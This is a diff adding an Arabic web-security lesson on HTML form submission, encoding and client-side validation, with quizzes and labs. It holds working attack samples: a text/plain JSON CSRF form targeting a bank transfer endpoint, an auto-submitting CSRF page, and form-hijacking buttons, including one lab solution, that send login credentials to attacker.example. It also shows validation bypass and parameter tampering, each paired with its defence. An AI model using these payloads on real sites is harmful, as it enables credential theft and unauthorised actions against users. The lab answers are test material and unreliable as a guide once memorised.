@@ -1,0 +1,376 @@
+      <section class="section" id="s09" data-part="الجزء 1 · HTML" data-pk="html" data-nav="الفورمز (2): الإرسال والـ Validation" data-icon="📨" data-keywords="form submission get post enctype urlencoded multipart text/plain boundary validation required pattern minlength maxlength min max step novalidate formnovalidate readonly disabled autocomplete formaction formmethod form attribute form hijacking csrf json csrf samesite client-side validation bypass mass assignment parameter tampering">
+        <div class="section-head">
+          <span class="section-index">09</span>
+          <div>
+            <p class="eyebrow">HTML · الدرس 09</p>
+            <h2>الفورمز (2): الإرسال، الـ Encoding، والـ Validation… وإزاي بيتعدّوا</h2>
+            <p class="lede">في الدرس ده هتعرف بالظبط بيحصل إيه من لحظة ما تدوس «Submit» لحد ما الـ request يطلع: الـ validation، الـ submit event، بناء البيانات، والـ encoding. وبعدها هنكسر كل ده: validation بيتشال في ثانية، form بتتخطف بزرار واحد، وJSON بيتبعت من فورم HTML عادية.</p>
+          </div>
+        </div>
+
+        <h3 class="sub">رحلة الـ submit</h3>
+        <scene id="sc-submit" title="من الضغطة للـ HTTP request">
+          <svg viewBox="0 0 1000 200" role="img" aria-label="مراحل إرسال الفورم">
+            <g data-s="1"><rect x="10" y="40" width="120" height="80" rx="12" class="d-box"/><text x="70" y="75" text-anchor="middle" class="d-tb" font-size="12">click</text><text x="70" y="97" text-anchor="middle" class="d-tx">submitter</text></g>
+            <g data-s="2"><rect x="150" y="40" width="120" height="80" rx="12" class="d-box3"/><text x="210" y="75" text-anchor="middle" class="d-tb" font-size="12">validation</text><text x="210" y="97" text-anchor="middle" class="d-tx">required, pattern…</text></g>
+            <g data-s="3"><rect x="290" y="40" width="120" height="80" rx="12" class="d-box2"/><text x="350" y="75" text-anchor="middle" class="d-tb" font-size="12">submit event</text><text x="350" y="97" text-anchor="middle" class="d-tx">JS can cancel</text></g>
+            <g data-s="4"><rect x="430" y="40" width="120" height="80" rx="12" class="d-box6"/><text x="490" y="75" text-anchor="middle" class="d-tb" font-size="12">entry list</text><text x="490" y="97" text-anchor="middle" class="d-tx">name=value pairs</text></g>
+            <g data-s="5"><rect x="570" y="40" width="120" height="80" rx="12" class="d-box4"/><text x="630" y="75" text-anchor="middle" class="d-tb" font-size="12">encode</text><text x="630" y="97" text-anchor="middle" class="d-tx">enctype</text></g>
+            <g data-s="6"><rect x="710" y="40" width="130" height="80" rx="12" class="d-box5"/><text x="775" y="75" text-anchor="middle" class="d-tb" font-size="12">HTTP request</text><text x="775" y="97" text-anchor="middle" class="d-tx">+ cookies</text></g>
+            <g data-s="7"><rect x="860" y="40" width="130" height="80" rx="12" class="d-dim"/><text x="925" y="75" text-anchor="middle" class="d-tb" font-size="12">navigate</text><text x="925" y="97" text-anchor="middle" class="d-tx">new page</text></g>
+            <path class="d-ar-acc" d="M130,80 L148,80 M270,80 L288,80 M410,80 L428,80 M550,80 L568,80 M690,80 L708,80 M840,80 L858,80"/>
+            <g data-from="2" data-to="2"><path class="d-ar-red d-dash" d="M210,122 C210,170 70,170 70,124"/><text x="140" y="188" text-anchor="middle" class="d-tx d-red">invalid → stop + message</text></g>
+            <g data-from="3" data-to="3"><text x="350" y="160" text-anchor="middle" class="d-tx d-vio">event.preventDefault() → no request</text></g>
+            <g data-from="4" data-to="4"><text x="490" y="160" text-anchor="middle" class="d-tx d-tea">skips: no name · disabled · unchecked</text></g>
+            <g data-from="6" data-to="6"><text x="775" y="160" text-anchor="middle" class="d-tx d-red">Burp sits here ↓ edits anything</text></g>
+          </svg>
+          <step>المستخدم داس على زرار submit (أو Enter في خانة). الزرار ده اسمه الـ <b>submitter</b>، ولو ليه <code>name</code> قيمته هتتبعت، ولو عليه <code>formaction</code>/<code>formmethod</code>… هيغيّر سلوك الفورم.</step>
+          <step><b>Constraint validation</b>: المتصفح بيتشيك <code>required</code> و<code>pattern</code> و<code>type</code>… لو فيه خانة invalid: بيوقف، بيطلّع رسالة، والـ <code>invalid</code> event بيطلع. (إلا لو فيه <code>novalidate</code> أو <code>formnovalidate</code>.)</step>
+          <step>الـ <code>submit</code> event بيطلع. JavaScript يقدر يوقف كل حاجة بـ <code>preventDefault()</code> — ده اللي الـ SPAs بتعمله عشان تبعت بالـ <code>fetch</code> بدل ما تغيّر الصفحة.</step>
+          <step>بناء الـ <b>entry list</b>: كل عنصر ليه <code>name</code> ومش disabled — مع استبعاد الـ checkbox/radio غير المختار والأزرار اللي مش هي الـ submitter.</step>
+          <step>الـ <b>encoding</b> حسب الـ <code>enctype</code>: urlencoded (الافتراضي)، أو multipart، أو text/plain.</step>
+          <step>الـ <b>HTTP request</b> بيتبني: GET = في الـ URL، POST = في الـ body، والـ cookies بتاعة الموقع المستهدف بتتلزق تلقائيًا (حسب SameSite). <b>هنا Burp بيقف</b> — وأي حاجة فاتت من المراحل اللي قبل (validation، hidden، disabled) ملهاش أي قيمة.</step>
+          <step>المتصفح بيعمل navigation: الـ response بيستبدل الصفحة (أو بيفتح في الـ <code>target</code>).</step>
+        </scene>
+
+        <h3 class="sub">GET ولا POST؟</h3>
+        <div class="cmp reveal">
+          <div><h5>GET</h5><p class="small">البيانات في الـ URL: <code>/search?q=shoes</code>. بتتحفظ في الـ history والـ bookmarks وlogs السيرفر والـ proxies، وممكن تتسرّب في الـ <code>Referer</code>. مناسبة للبحث والفلترة (عمليات قراية). <b>عمرها ما تبقى لـ passwords أو tokens.</b></p></div>
+          <div><h5>POST</h5><p class="small">البيانات في الـ body. مبتتحفظش في الـ URL، ومناسبة لأي حاجة بتغيّر state (login، شراء، حذف). بس متفتكرش إنها «مخفية»: أي proxy أو DevTools بيشوفها، والـ HTTPS هو اللي بيحميها في الطريق.</p></div>
+        </div>
+        <div class="callout warn reveal"><span class="ci">⚠️</span><div><strong>GET بيمسح الـ query بتاع الـ action</strong><p>فورم <code>method="get"</code> و<code>action="/search?lang=ar"</code>: المتصفح <b>بيستبدل</b> الـ query كلها بالـ form data، فالـ <code>lang=ar</code> بتضيع. لو محتاجها، حطها <code>input type="hidden"</code>. (في POST الـ query بتفضل في الـ URL والداتا في الـ body.)</p></div></div>
+        <html-example file="get-query.html" auto url="https://shop.example/">
+          <!DOCTYPE html>
+          <html lang="en">
+          <head><meta charset="UTF-8"><title>GET replaces query</title></head>
+          <body>
+            <form action="/search?lang=ar&amp;v=2" method="get">
+              <input name="q" value="xss"> <button>GET</button>
+            </form>
+            <form action="/search?lang=ar&amp;v=2" method="post">
+              <input name="q" value="xss"> <button>POST</button>
+            </form>
+          </body>
+          </html>
+        </html-example>
+
+        <h3 class="sub">الـ enctype: 3 أشكال للـ body</h3>
+        <html-example file="enctypes.html" auto url="https://shop.example/upload" max="420">
+          <!DOCTYPE html>
+          <html lang="en">
+          <head><meta charset="UTF-8"><title>enctype</title></head>
+          <body>
+            <form action="/a" method="post">
+              <input name="name" value="Omar & Co"><input name="note" value="hi=1">
+              <button>urlencoded (default)</button>
+            </form>
+            <form action="/b" method="post" enctype="multipart/form-data">
+              <input name="name" value="Omar & Co"><input type="file" name="doc">
+              <button>multipart/form-data</button>
+            </form>
+            <form action="/c" method="post" enctype="text/plain">
+              <input name="name" value="Omar & Co"><input name="note" value="hi=1">
+              <button>text/plain</button>
+            </form>
+          </body>
+          </html>
+        </html-example>
+        <div class="table-wrap reveal"><table class="ref">
+          <thead><tr><th>enctype</th><th>الشكل</th><th>إمتى</th></tr></thead>
+          <tbody>
+            <tr><td><code>application/x-www-form-urlencoded</code></td><td><code>name=Omar+%26+Co&amp;note=hi%3D1</code> — المسافة <code>+</code>، والحروف الخاصة <code>%HH</code></td><td>الافتراضي لأي فورم</td></tr>
+            <tr><td><code>multipart/form-data</code></td><td>أجزاء مفصولة بـ <b>boundary</b>، كل جزء بـ <code>Content-Disposition</code> والملف بمحتواه الخام</td><td><b>لازم</b> لرفع الملفات (من غيره بيتبعت اسم الملف بس)</td></tr>
+            <tr><td><code>text/plain</code></td><td><code>name=Omar &amp; Co</code> + سطر جديد — <b>من غير أي encoding</b></td><td>نادر جدًا… إلا في الهجمات (تحت)</td></tr>
+          </tbody>
+        </table></div>
+        <div class="callout pt reveal"><span class="ci">🎯</span><div><strong>JSON CSRF بفورم text/plain</strong><p>API بيقبل JSON ومش بيتشيك الـ <code>Content-Type</code>؟ فورم HTML تقدر تبعت body شكله JSON: الـ <code>text/plain</code> بيكتب <code>name=value</code> زي ما هم. فلو الـ name = <code>{"amount":1000,"to":"attacker","x":"</code> والـ value = <code>"}</code>، الـ body يبقى <code>{"amount":1000,"to":"attacker","x":"="}</code> — JSON سليم! والفورم دي ممكن تتبعت من أي موقع (cross-site) بالـ cookies بتاعة الضحية (حسب الـ SameSite). جرّب:</p></div></div>
+        <html-example file="json-csrf.html" auto url="https://attacker.example/poc.html">
+          <!DOCTYPE html>
+          <html lang="en">
+          <head><meta charset="UTF-8"><title>PoC</title></head>
+          <body>
+            <form action="https://bank.example/api/transfer" method="post" enctype="text/plain">
+              <input type="hidden" name='{"amount":1000,"to":"attacker","x":"' value='"}'>
+              <button>Claim your prize</button>
+            </form>
+          </body>
+          </html>
+        </html-example>
+
+        <h3 class="sub">الـ Validation في المتصفح</h3>
+        <div class="table-wrap reveal"><table class="ref">
+          <thead><tr><th>الـ attribute</th><th>القاعدة</th></tr></thead>
+          <tbody>
+            <tr><td><code>required</code></td><td>لازم قيمة (وفي الـ checkbox: لازم يتعلّم عليه، وفي radio group: واحد يتختار)</td></tr>
+            <tr><td><code>minlength</code> / <code>maxlength</code></td><td>طول النص. الـ <code>maxlength</code> بيمنعك <b>تكتب</b> أكتر أصلًا</td></tr>
+            <tr><td><code>min</code> / <code>max</code> / <code>step</code></td><td>للأرقام والتواريخ</td></tr>
+            <tr><td><code>pattern</code></td><td>regex لازم يطابق <b>القيمة كلها</b> (المتصفح بيحطه بين <code>^(?:</code> و<code>)$</code> لوحده)</td></tr>
+            <tr><td><code>type="email|url"</code></td><td>الشكل العام</td></tr>
+            <tr><td><code>novalidate</code> (form) / <code>formnovalidate</code> (زرار)</td><td>اقفل الـ validation</td></tr>
+          </tbody>
+        </table></div>
+        <html-example file="validation.html" auto url="https://shop.example/signup">
+          <!DOCTYPE html>
+          <html lang="en">
+          <head><meta charset="UTF-8"><title>Validation</title>
+          <style>input:invalid{border:2px solid #e11d48} input:valid{border:2px solid #16a34a}</style></head>
+          <body>
+            <form action="/signup" method="post">
+              <p><input name="user" required pattern="[a-z0-9_]{3,16}" placeholder="user (a-z 0-9 _)"></p>
+              <p><input name="pin" required minlength="4" maxlength="6" inputmode="numeric" placeholder="PIN 4-6"></p>
+              <p><input name="age" type="number" min="18" max="120" placeholder="age"></p>
+              <p><input name="site" type="url" placeholder="https://…"></p>
+              <button>Sign up</button>
+              <button formnovalidate>Skip checks (formnovalidate)</button>
+            </form>
+          </body>
+          </html>
+        </html-example>
+        <div class="callout pt reveal"><span class="ci">🎯</span><div><strong>كل ده بيتعدّى في ثانية</strong><p>(1) DevTools → امسح <code>required</code>/<code>pattern</code>/<code>maxlength</code>. (2) زرار عليه <code>formnovalidate</code> أو فورم عليها <code>novalidate</code>. (3) الأسهل: Burp يمسك الـ request <b>بعد</b> الـ validation ويغيّر اللي إنت عايزه. (4) <code>curl</code> من غير متصفح خالص. لو السيرفر بيعتمد على الـ validation بتاع المتصفح، جرّب: قيم فاضية، طويلة جدًا (buffer/DoS)، أنواع غلط (<code>age=abc</code>)، سالبة، وحروف خاصة.</p></div></div>
+
+        <h3 class="sub">readonly ضد disabled</h3>
+        <div class="table-wrap reveal"><table class="ref">
+          <thead><tr><th></th><th><code>readonly</code></th><th><code>disabled</code></th></tr></thead>
+          <tbody>
+            <tr><td>المستخدم يقدر يعدّل؟</td><td class="t-no">لأ (من الـ UI)</td><td class="t-no">لأ</td></tr>
+            <tr><td>بياخد focus ويتنسخ؟</td><td class="t-ok">أيوه</td><td class="t-no">لأ</td></tr>
+            <tr><td><b>بيتبعت مع الفورم؟</b></td><td class="t-ok">أيوه</td><td class="t-no">لأ</td></tr>
+            <tr><td>عليه validation؟</td><td class="t-no">لأ</td><td class="t-no">لأ</td></tr>
+          </tbody>
+        </table></div>
+        <p>🎯 خانة <code>readonly</code> زي <code>&lt;input name="email" value="me@x" readonly&gt;</code> = parameter بيتبعت وانت «مش مفروض» تغيّره — يعني لازم تجرّب تغيّره. السيرفر لازم يتجاهل أي قيمة جاية من المستخدم للحاجات اللي مش من حقه يغيّرها.</p>
+
+        <h3 class="sub">autocomplete</h3>
+        <p>بيقول للمتصفح ومدير الـ passwords الخانة دي إيه: <code>autocomplete="username"</code>، <code>"current-password"</code>، <code>"new-password"</code> (عشان يقترح password قوي)، <code>"one-time-code"</code> (OTP)، <code>"email"</code>، <code>"cc-number"</code>… أو <code>"off"</code>. المتصفحات الحديثة غالبًا <b>بتتجاهل</b> <code>off</code> في خانات الـ login عشان مديري الـ passwords يفضلوا شغالين — فالـ finding «autocomplete enabled on password field» بقى ملوش قيمة كبيرة في تقارير الـ pentest الحديثة.</p>
+
+        <h3 class="sub">التحكم في الفورم من برّاها: form وformaction</h3>
+        <p>الزرار يقدر يغيّر سلوك الفورم: <code>formaction</code>، <code>formmethod</code>، <code>formenctype</code>، <code>formtarget</code>، <code>formnovalidate</code>. وأي عنصر في الصفحة يقدر ينضم لفورم <b>من بعيد</b> بـ <code>form="id"</code> حتى لو مش جواها. جرّب الزرار الأحمر (اللي <b>برا</b> الفورم خالص):</p>
+        <html-example file="form-hijack.html" auto url="https://shop.example/login">
+          <!DOCTYPE html>
+          <html lang="en">
+          <head><meta charset="UTF-8"><title>Login</title></head>
+          <body>
+            <form id="login" action="/session" method="post">
+              <input name="user" value="victim">
+              <input name="pass" type="password" value="S3cret!">
+              <button>Login</button>
+            </form>
+
+            <!-- injected by an attacker somewhere later in the page (no script!) -->
+            <p>Comment by guest:
+              <button form="login" formaction="https://attacker.example/collect" formmethod="get"
+                      style="background:#e11d48;color:#fff;border:0;padding:6px 12px;border-radius:6px">
+                Continue reading →
+              </button>
+            </p>
+          </body>
+          </html>
+        </html-example>
+        <div class="callout pt reveal"><span class="ci">🎯</span><div><strong>Form hijacking بـ HTML injection من غير JavaScript</strong><p>فلتر بيمنع كل الـ scripts والـ event handlers، بس بيسمح بـ <code>button</code> وattributes زي <code>form</code> و<code>formaction</code>؟ زرار «Continue reading» بقى بيبعت الـ username والـ password (اللي ملاهم مدير الـ passwords تلقائيًا!) لسيرفر المهاجم. نفس الفكرة: حقن <code>&lt;form action="https://attacker.example"&gt;</code> <b>قبل</b> فورم الـ login الحقيقية — الـ parser بيتجاهل <code>&lt;form&gt;</code> الجاية لأن فيه فورم مفتوحة (مينفعش forms متداخلة)، فخانات الـ login تنضم لفورم المهاجم. الدفاع: CSP <code>form-action 'self'</code>.</p></div></div>
+
+        <h3 class="sub">التلاعب بالـ parameters</h3>
+        <div class="grid-2">
+          <div class="card reveal"><div class="ico">💰</div><h4>Parameter tampering</h4><p><code>&lt;input type="hidden" name="price" value="499"&gt;</code> في فورم checkout = اطلب المنتج بـ <code>price=1</code>. أي قيمة بيتحسب منها حاجة مهمة لازم تتجاب من السيرفر/الـ database، مش من الـ request.</p></div>
+          <div class="card reveal"><div class="ico">🧩</div><h4>Mass assignment</h4><p>فورم «تعديل البروفايل» فيها <code>name</code> و<code>bio</code> بس. ضيف إنت <code>&amp;role=admin</code> أو <code>&amp;is_verified=1</code> للـ request. frameworks كتير بتربط كل الـ parameters بالـ model أوتوماتيك لو المطوّر مش عامل allow-list.</p></div>
+          <div class="card reveal"><div class="ico">🔁</div><h4>Parameter pollution</h4><p>نفس الاسم مرتين: <code>to=me&amp;to=attacker</code>. لو الـ WAF بيبص على الأول والـ backend بياخد التاني (أو العكس) = bypass.</p></div>
+          <div class="card reveal"><div class="ico">🎭</div><h4>CSRF</h4><p>أي فورم POST ممكن تتبني في صفحة على موقع تاني وتتبعت للموقع المستهدف — والمتصفح بيلزق cookies الضحية لو الـ SameSite بيسمح. الحماية: <b>CSRF token</b> سري في كل فورم + <code>SameSite</code> + التحقق من <code>Origin</code>. (Chrome بيعتبر الـ cookie اللي من غير SameSite = <code>Lax</code>، بس مش كل المتصفحات.)</p></div>
+        </div>
+        <code-block lang="html" file="csrf-poc.html">
+          <!-- classic CSRF proof-of-concept: auto-submits when the victim opens the page -->
+          <!DOCTYPE html>
+          <html>
+          <body>
+            <form id="f" action="https://shop.example/account/email" method="post">
+              <input type="hidden" name="email" value="attacker@evil.example">
+            </form>
+            <script>document.getElementById("f").submit();</script>
+          </body>
+          </html>
+        </code-block>
+
+        <div class="exercises">
+          <div class="exercises-head"><h3><span class="bulb">✏️</span> تمارين الدرس 09</h3></div>
+          <quiz id="s09-q1" answer="2">
+            <q>فورم login بـ `method="get"`. إيه أكبر مشكلة؟</q>
+            <o>الصفحة هتبقى أبطأ</o>
+            <o>الـ password مش هيتبعت</o>
+            <o>الـ password هيبقى في الـ URL: الـ history، logs السيرفر والـ proxies، وممكن يتسرّب في الـ Referer</o>
+            <o>مفيش مشكلة لو HTTPS</o>
+            <good>الـ HTTPS بيشفّر الـ URL في الطريق، بس الـ URL بيتسجّل في أماكن كتير على الطرفين. Credentials = POST دايمًا.</good>
+            <bad>الـ GET بيحط الداتا في الـ URL، والـ URL بيتحفظ ويتسجّل في الـ history والـ logs ويتسرّب. الـ HTTPS مش بيحل ده.</bad>
+          </quiz>
+          <quiz id="s09-q2" answer="1">
+            <q>`<input name="email" value="me@x.example" readonly>`. الحقيقة؟</q>
+            <o>القيمة مش بتتبعت</o>
+            <o>القيمة بتتبعت، والمستخدم يقدر يغيّرها بـ DevTools أو Burp — السيرفر لازم ميثقش فيها</o>
+            <o>المتصفح بيشفّر القيمة</o>
+            <o>زي disabled بالظبط</o>
+            <good>readonly = بيتبعت بس مش قابل للتعديل من الـ UI. أي حاجة بتتبعت ممكن تتغير.</good>
+            <bad>readonly بيتبعت (عكس disabled). وأي قيمة بتطلع من المتصفح تقدر تتعدّل قبل ما توصل.</bad>
+          </quiz>
+          <quiz id="s09-q3" answer="0">
+            <q>`pattern="[0-9]{4}"` والمستخدم كتب `12345`. valid؟</q>
+            <o>لأ — الـ pattern لازم يطابق القيمة كلها، و5 أرقام مش 4</o>
+            <o>أيوه لأن فيه 4 أرقام جوه</o>
+            <o>أيوه لأن كلها أرقام</o>
+            <o>الـ pattern مبيشتغلش على text</o>
+            <good>المتصفح بيعمل anchoring لوحده (`^(?:[0-9]{4})$`). بس افتكر: ده في المتصفح بس.</good>
+            <bad>الـ pattern بيتطابق على القيمة <b>كاملة</b> — زي `^…$`. `12345` 5 أرقام فمش valid.</bad>
+          </quiz>
+          <quiz id="s09-q4" answer="3">
+            <q>عايز ترفع ملف بفورم. لازم إيه؟</q>
+            <o>`method="get"`</o>
+            <o>`enctype="text/plain"`</o>
+            <o>`accept="*"`</o>
+            <o>`method="post"` و`enctype="multipart/form-data"`</o>
+            <good>من غير multipart، الـ urlencoded بيبعت اسم الملف بس من غير محتواه.</good>
+            <bad>الملفات محتاجة `multipart/form-data` (و POST). غير كده بيتبعت الاسم بس.</bad>
+          </quiz>
+          <quiz id="s09-q5" answer="2">
+            <q>في صفحة login، مهاجم قدر يحقن HTML (من غير scripts) <b>بعد</b> الفورم. أنهي حقنة تسرق الـ credentials لما الضحية تدوس عليها؟</q>
+            <o>`<a href="https://attacker.example">Continue</a>`</o>
+            <o>`<img src="https://attacker.example/log">`</o>
+            <o>`<button form="login" formaction="https://attacker.example/c">Continue</button>`</o>
+            <o>`<input name="pass">`</o>
+            <good>الـ `form` بيربط الزرار بفورم الـ login، والـ `formaction` بيغيّر الوجهة — فالخانات (اللي مليانة) تروح للمهاجم. الدفاع: CSP `form-action`.</good>
+            <bad>اللينك والصورة مش بيبعتوا خانات الفورم. الزرار بـ `form` + `formaction` بيبعت الفورم كلها لسيرفر المهاجم.</bad>
+          </quiz>
+          <quiz id="s09-q6" answer="1">
+            <q>إيه اللي بيمنع موقع `evil.example` إنه يعمل فورم بتبعت POST لـ `bank.example/transfer`؟</q>
+            <o>المتصفح بيمنع أي فورم لموقع تاني</o>
+            <o>مفيش حاجة بتمنع الإرسال نفسه — الحماية من الـ CSRF لازم تيجي من الموقع: CSRF token، SameSite cookies، وتشيك على Origin</o>
+            <o>الـ CORS بيمنعه</o>
+            <o>الـ HTTPS</o>
+            <good>الفورمز «cross-site» مسموحة من أول الويب. الـ CORS بيتحكم في قراية الـ responses من JS، مش في إرسال فورم.</good>
+            <bad>المتصفح بيبعت الفورم عادي (ويمكن بالـ cookies). الـ CORS مالوش علاقة بالفورمز العادية. الحماية في الموقع المستهدف.</bad>
+          </quiz>
+          <quiz id="s09-q7" answer="0">
+            <q>`<form action="/search?lang=ar" method="get"><input name="q" value="a"></form>` — الـ URL بعد الإرسال؟</q>
+            <o>`/search?q=a`</o>
+            <o>`/search?lang=ar&q=a`</o>
+            <o>`/search?lang=ar`</o>
+            <o>`/search?q=a&lang=ar`</o>
+            <good>في GET الـ form data بتستبدل الـ query بتاع الـ action بالكامل.</good>
+            <bad>الـ spec بتقول «mutate action URL»: الـ query بيتبدّل بالـ form data. الـ `lang=ar` بتضيع.</bad>
+          </quiz>
+
+          <html-lab id="s09-lab1" title="قواعد validation للتسجيل" level="1" url="https://shop.example/signup">
+            <desc><p>ضيف قواعد الـ validation دي (بالـ attributes بس):</p>
+            <ul><li><code>username</code>: إجباري، وبس حروف small وأرقام و<code>_</code>، من 3 لـ 16 حرف.</li>
+            <li><code>password</code>: إجباري، <code>type="password"</code>، 12 حرف على الأقل، و<code>autocomplete="new-password"</code>.</li>
+            <li><code>age</code>: رقم من 18 لـ 120.</li>
+            <li><code>email</code>: إجباري ونوعه email.</li></ul>
+            <p>وبعد ما تخلّص: اختبر الـ bypass بنفسك — ضيف زرار تاني عليه <code>formnovalidate</code> وشوف إنه بيبعت أي حاجة.</p></desc>
+            <starter>
+              <!DOCTYPE html>
+              <html lang="en">
+              <head><meta charset="UTF-8"><title>Sign up</title></head>
+              <body>
+                <form action="/signup" method="post">
+                  <p><label>Username <input name="username"></label></p>
+                  <p><label>Password <input name="password"></label></p>
+                  <p><label>Age <input name="age"></label></p>
+                  <p><label>Email <input name="email"></label></p>
+                  <button>Create</button>
+                </form>
+              </body>
+              </html>
+            </starter>
+            <solution>
+              <!DOCTYPE html>
+              <html lang="en">
+              <head><meta charset="UTF-8"><title>Sign up</title></head>
+              <body>
+                <form action="/signup" method="post">
+                  <p><label>Username <input name="username" required pattern="[a-z0-9_]{3,16}"></label></p>
+                  <p><label>Password <input name="password" type="password" required minlength="12" autocomplete="new-password"></label></p>
+                  <p><label>Age <input name="age" type="number" min="18" max="120"></label></p>
+                  <p><label>Email <input name="email" type="email" required></label></p>
+                  <button>Create</button>
+                  <button formnovalidate>Bypass (test)</button>
+                </form>
+              </body>
+              </html>
+            </solution>
+            <test label="username: `Bad Name!` و`ab` invalid، و`good_name` valid" live>(() => { const u = document.forms[0].username; if (!u.required) return false; u.value = "Bad Name!"; const a = !u.checkValidity(); u.value = "ab"; const b = !u.checkValidity(); u.value = "good_name"; const c = u.checkValidity(); u.value = "a".repeat(17); const d = !u.checkValidity(); return a && b && c && d; })()</test>
+            <test label="password: إجباري، type password، 12+ حرف، `new-password`">$('[name="password"]').type === "password" && $('[name="password"]').required && Number(attr('[name="password"]', "minlength")) === 12 && attr('[name="password"]', "autocomplete") === "new-password"</test>
+            <test label="age: رقم 18 → 120">$('[name="age"]').type === "number" && attr('[name="age"]', "min") === "18" && attr('[name="age"]', "max") === "120"</test>
+            <test label="email: إجباري ونوعه email">$('[name="email"]').type === "email" && $('[name="email"]').required</test>
+            <test label="الفورم فاضية = invalid (المتصفح هيمنع الإرسال)" live>!document.forms[0].checkValidity()</test>
+            <hint>`pattern="[a-z0-9_]{3,16}"` — والمتصفح بيضيف `^` و`$` لوحده. و`minlength` مش `min`.</hint>
+          </html-lab>
+
+          <html-lab id="s09-lab2" title="PoC: اخطف فورم الـ login (من غير JavaScript)" level="3" url="https://shop.example/login">
+            <desc><p>إنت pentester ولقيت HTML injection في خانة «comment» تحت فورم الـ login (الفلتر بيمسح <code>&lt;script&gt;</code> وأي <code>on*</code>). اكتب الـ payload مكان الـ comment بحيث:</p>
+            <ul><li>زرار <b>برا</b> الفورم (جوه الـ <code>div.comment</code>) مكتوب عليه «Read more».</li>
+            <li>لما يتداس، يبعت خانات <code>#login</code> لـ <code>https://attacker.example/collect</code> بـ <b>GET</b>.</li>
+            <li>من غير أي <code>script</code> ولا <code>on…</code> attribute.</li></ul>
+            <p>جرّب في المعاينة: اكتب user/pass في الفورم ودوس «Read more» — لازم تشوف الـ request رايح لـ <code>attacker.example</code> وفيه الـ password.</p></desc>
+            <starter>
+              <!DOCTYPE html>
+              <html lang="en">
+              <head><meta charset="UTF-8"><title>Login</title></head>
+              <body>
+                <form id="login" action="/session" method="post">
+                  <input name="user" placeholder="user">
+                  <input name="pass" type="password" placeholder="password">
+                  <button>Login</button>
+                </form>
+                <div class="comment">
+                  <!-- the attacker-controlled comment goes here -->
+                  Nice shop!
+                </div>
+              </body>
+              </html>
+            </starter>
+            <solution>
+              <!DOCTYPE html>
+              <html lang="en">
+              <head><meta charset="UTF-8"><title>Login</title></head>
+              <body>
+                <form id="login" action="/session" method="post">
+                  <input name="user" placeholder="user">
+                  <input name="pass" type="password" placeholder="password">
+                  <button>Login</button>
+                </form>
+                <div class="comment">
+                  Nice shop!
+                  <button form="login" formaction="https://attacker.example/collect" formmethod="get">Read more</button>
+                </div>
+              </body>
+              </html>
+            </solution>
+            <test label="الزرار جوه `div.comment` (برا الفورم) ومكتوب عليه Read more">$$("div.comment button").some(b => /read more/i.test(b.textContent)) && !$("#login").contains($("div.comment button"))</test>
+            <test label="الزرار مربوط بفورم `#login`">$("div.comment button") && $("div.comment button").form === $("#login")</test>
+            <test label="الوجهة `https://attacker.example/collect` بـ GET">attr("div.comment button", "formaction") === "https://attacker.example/collect" && $("div.comment button").formMethod === "get"</test>
+            <test label="مفيش `script` ولا event handlers">count("script") === 0 && !$$("*").some(e => [...e.attributes].some(a => /^on/i.test(a.name)))</test>
+            <hint>الـ attributes اللي محتاجها كلها على الزرار: `form="login"` + `formaction="…"` + `formmethod="get"`.</hint>
+          </html-lab>
+
+          <task id="s09-t1" title="الـ body بتاع JSON CSRF" level="2" answer='{"amount":1000,"to":"attacker","x":"="}'>
+            <desc><p>المهاجم حط الفورم دي في صفحته. لما الضحية تدوس، إيه <b>الـ body</b> اللي هيتبعت لـ <code>bank.example</code>؟ (السطر الأول بس، من غير الـ CRLF في الآخر)</p></desc>
+            <listing lang="html" file="poc.html">
+              <form action="https://bank.example/api/transfer" method="post" enctype="text/plain">
+                <input type="hidden" name='{"amount":1000,"to":"attacker","x":"' value='"}'>
+                <button>Claim your prize</button>
+              </form>
+            </listing>
+            <hint>`text/plain` بيكتب `name` + `=` + `value` من غير أي encoding.</hint>
+            <explain>`{"amount":1000,"to":"attacker","x":"="}` — الـ `=` اللي الـ text/plain بيحطها وقعت جوه string JSON اسمها `x` فالـ JSON فضل سليم. لو الـ API مبيتشيكش إن الـ `Content-Type` = `application/json` (أو بيقبل `text/plain`)، والـ cookies بتتبعت cross-site — يبقى عندك CSRF على API. الدفاع: ارفض أي content type غير JSON، وCSRF tokens، وSameSite.</explain>
+          </task>
+          <task id="s09-t2" title="كام parameter هيوصل؟" level="1" answer="3" norm="int">
+            <desc><p>المستخدم داس «Pay». <b>كام parameter</b> هيبقى في الـ body؟</p></desc>
+            <listing lang="html" file="checkout.html">
+              <form action="/pay" method="post">
+                <input name="card" value="4111111111111111">
+                <input name="amount" value="499" readonly>
+                <input name="currency" value="EGP" disabled>
+                <input id="promo" value="SAVE10">
+                <label><input type="checkbox" name="save_card"> Save card</label>
+                <button name="op" value="pay">Pay</button>
+              </form>
+            </listing>
+            <explain>3: `card` و`amount` (readonly بيتبعت!) و`op=pay` (الزرار اللي اتداس). `currency` disabled، و`promo` مالوش name، و`save_card` مش متعلّم عليه. 🎯 لاحظ إن `amount` المبلغ بيتبعت من المتصفح — جرّب تغيّره.</explain>
+          </task>
+        </div>
+      </section>
